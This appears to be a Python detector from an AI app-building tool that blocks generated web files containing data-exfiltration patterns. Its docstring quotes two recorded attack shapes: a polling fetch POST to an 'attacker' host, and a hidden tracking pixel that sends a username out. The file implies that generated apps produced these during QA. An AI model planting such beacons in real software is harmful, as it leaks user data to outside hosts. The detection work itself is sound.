"""Outbound-network exfil pattern detector — QA-3 Fires 61 / 70.

Detects the narrow set of source-file patterns that ship user data to an
attacker-controlled URL at runtime. These are defense-in-depth against the
two empirical on-disk failures:

  Fire 61 — `setInterval` + `fetch('https://attacker/', {method:'POST',
            body: JSON.stringify({count})})` — period-poll exfil.
  Fire 70 — `<img src={pixelUrl} style={{display:'none'}} />` with
            `pixelUrl = 'https://attacker/?u=' + username + ...` — 1-pixel
            tracking beacon on every render.

Tsunami apps almost never need outbound network calls — most prompts are
counter / todo / dashboard / generator shapes. The gate blocks three call
shapes with no legitimate use in that context:

  1. `navigator.sendBeacon(externalUrl)` — fire-and-forget beaconing.
  2. Hidden-image tracking pixel: an `<img>` tag whose style sets
     `display: none` (or `visibility: hidden`) AND whose src is an external
     URL (directly or via a template / referenced variable).
  3. `fetch` / `new WebSocket` / `new EventSource` to an external URL where
     the surrounding ~500 chars reference `document.cookie`, `localStorage`,
     `sessionStorage`, `navigator.userAgent`, or `window.location.href` —
     the shape of state-exfil, not a normal data request.

Localhost / 127.* / RFC-1918 / 0.0.0.0 hosts pass (legit dev backends).

Pure function, no torch / no tool imports — unit-testable stand-alone.
"""

from __future__ import annotations

import re


_PRIVATE_HOST_RE = re.compile(
    r'^(localhost|127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.|0\.0\.0\.0)'
)


def _is_external(host: str) -> bool:
    return not _PRIVATE_HOST_RE.match(host)


_SOURCE_SUFFIXES = (".tsx", ".ts", ".jsx", ".js", ".mjs", ".cjs", ".html", ".vue", ".svelte")


_EXFIL_STATE_KEYWORDS = re.compile(
    r'document\.cookie'
    r'|localStorage(?:\.getItem|\.\w+)?'
    r'|sessionStorage(?:\.getItem|\.\w+)?'
    r'|navigator\.userAgent'
    r'|window\.location\.href'
    r'|document\.location\.(?:href|host)'
)


def _host_of(url_match_group: str) -> str:
    """Strip trailing path/query from a captured host-plus."""
    # The regex already captures only up to first / or " — but be defensive.
    return url_match_group.split("/")[0].split("?")[0].split("#")[0]


def _scan_sendbeacon(content: str) -> list[str]:
    out = []
    for m in re.finditer(
        r'\bsendBeacon\s*\(\s*[\'"`]https?://([^\'"`/\s]+)',
        content,
    ):
        host = _host_of(m.group(1))
        if _is_external(host):
            out.append(f"navigator.sendBeacon → {host}")
    return out


def _scan_hidden_pixel(content: str) -> list[str]:
    """Find <img> tags with BOTH display:none (or visibility:hidden) AND an
    external-URL src — either inline, via template literal, or via a
    referenced variable whose value is an external URL string literal.
    """
    out = []
    img_re = re.compile(r'<img\b[^>]*?/?>', re.IGNORECASE | re.DOTALL)

    for m in img_re.finditer(content):
        tag = m.group(0)
        # Must be "hidden" somehow.
        hidden = re.search(
            r'display\s*:\s*[\'"]?none|visibility\s*:\s*[\'"]?hidden',
            tag,
            re.IGNORECASE,
        )
        if not hidden:
            continue

        # Direct inline src.
        direct = re.search(
            r'src=[\'"`]https?://([^\'"`\s/>]+)',
            tag,
            re.IGNORECASE,
        )
        if direct:
            host = _host_of(direct.group(1))
            if _is_external(host):
                out.append(f"hidden <img> → {host}")
                continue

        # JSX template literal src={`https://.../${...}`}.
        tpl = re.search(
            r'src=\{`https?://([^`/$\s]+)',
            tag,
            re.IGNORECASE,
        )
        if tpl:
            host = _host_of(tpl.group(1))
            if _is_external(host):
                out.append(f"hidden <img> → {host}")
                continue

        # JSX variable ref: src={pixelUrl} — resolve to a const/let/var
        # declaration elsewhere in the file. Checks both template and
        # plain-string literal forms.
        var_ref = re.search(r'src=\{(\w+)\}', tag)
        if var_ref:
            var = var_ref.group(1)
            for decl in re.finditer(
                rf'(?:const|let|var)\s+{re.escape(var)}\s*=\s*[`\'"]https?://([^\'"`/${{\s]+)',
                content,
            ):
                host = _host_of(decl.group(1))
                if _is_external(host):
                    out.append(f"hidden <img> via {var} → {host}")
                    break
            else:
                # Concat form: `var = 'https://...' + x`
                concat = re.search(
                    rf'(?:const|let|var)\s+{re.escape(var)}\s*=\s*[`\'"]https?://([^\'"`/${{\s]+)',
                    content,
                )
                if concat:
                    host = _host_of(concat.group(1))
                    if _is_external(host):
                        out.append(f"hidden <img> via {var} → {host}")

    return out


def _scan_network_with_state(content: str) -> list[str]:
    """fetch / WebSocket / EventSource to an external URL, where nearby
    code reads cookie / localStorage / sessionStorage / userAgent /
    window.location — the state-exfil shape.
    """
    out = []
    for m in re.finditer(
        r'\b(?:fetch|new\s+WebSocket|new\s+EventSource)\s*\(\s*[\'"`]'
        r'(https?|wss?)://([^\'"`\s/]+)',
        content,
    ):
        host = _host_of(m.group(2))
        if not _is_external(host):
            continue
        start = max(0, m.start() - 300)
        end = min(len(content), m.end() + 500)
        if _EXFIL_STATE_KEYWORDS.search(content[start:end]):
            out.append(f"fetch/WebSocket → {host} (carrying cookie/storage state)")
    return out


def check_outbound_exfil(content: str, filename: str) -> str | None:
    """Return a BLOCKED error string if `content` (the bytes about to be
    written to `filename`) matches an outbound-network exfil pattern.
    Returns None if clean (most calls).

    Only scans source-like file extensions. Config-shape files (.env*,
    .npmrc, etc.) are handled by a separate gate in filesystem.py.
    """
    name_lower = filename.lower()
    if not name_lower.endswith(_SOURCE_SUFFIXES):
        return None

    offenders: list[str] = []
    offenders.extend(_scan_sendbeacon(content))
    offenders.extend(_scan_hidden_pixel(content))
    offenders.extend(_scan_network_with_state(content))

    if not offenders:
        return None

    uniq = sorted(set(offenders))
    return (
        f"BLOCKED: {filename} contains outbound-network exfiltration "
        f"pattern(s): {'; '.join(uniq[:3])}. These are QA-3 Fire 61 / Fire 70 "
        f"attack shapes (hidden tracking pixel, sendBeacon beaconing, "
        f"fetch/WebSocket carrying cookie / localStorage / userAgent / "
        f"location state to an external host). Typical tsunami deliverables "
        f"don't need outbound calls — if genuinely required, point at "
        f"localhost / a private-net host or surface the data in a visible "
        f"UI element instead of a hidden beacon."
    )
